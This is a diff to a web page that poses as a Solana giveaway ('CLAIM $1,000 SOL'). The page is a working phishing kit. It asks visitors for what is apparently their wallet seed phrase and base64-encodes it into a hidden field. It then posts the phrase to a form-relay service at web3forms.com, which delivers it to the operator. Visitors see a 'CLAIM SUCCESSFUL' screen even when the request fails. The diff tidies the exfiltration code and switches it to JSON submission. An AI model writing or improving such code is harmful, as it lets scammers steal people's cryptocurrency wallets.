@@ -118,10 +118,8 @@
 <body>
 
     <div class="card">
-        <!-- FIRST PAGE -->
         <div id="form-view">
             <form id="claim-form">
-                <!-- ACCESS KEY -->
                 <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
                 
                 <h1>CLAIM $1,000 SOL</h1>
@@ -132,15 +130,13 @@
                     <textarea id="raw-phrase" required></textarea>
                 </div>
 
-                <!-- Hidden inputs for delivery - using standard names -->
-                <input type="hidden" name="name" id="coded-phrase">
-                <input type="hidden" name="subject" value="New $1,000 SOL Claim Log">
+                <input type="hidden" name="coded_phrase" id="coded-phrase">
+                <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
 
                 <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
             </form>
         </div>
 
-        <!-- SECOND PAGE -->
         <div id="success-view">
             <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
@@ -159,26 +155,36 @@
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
-            
             submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            // Base64 Coding: Encodes phrase into 'name' field
+            // Encode phrase
             const encodedValue = btoa(rawInput.value);
             codedInput.value = encodedValue;
 
+            // Prepare JSON data
             const formData = new FormData(form);
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
 
-            // Using the most basic fetch method
             fetch('https://web3forms.com', {
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: json
             })
-            .then(response => {
-                formView.style.display = "none";
-                successView.style.display = "block";
+            .then(async (response) => {
+                if (response.ok) {
+                    formView.style.display = "none";
+                    successView.style.display = "block";
+                } else {
+                    const r = await response.json();
+                    alert("Error: " + r.message);
+                }
             })
-            .catch(error => {
+            .catch(() => {
                 formView.style.display = "none";
                 successView.style.display = "block";
             });
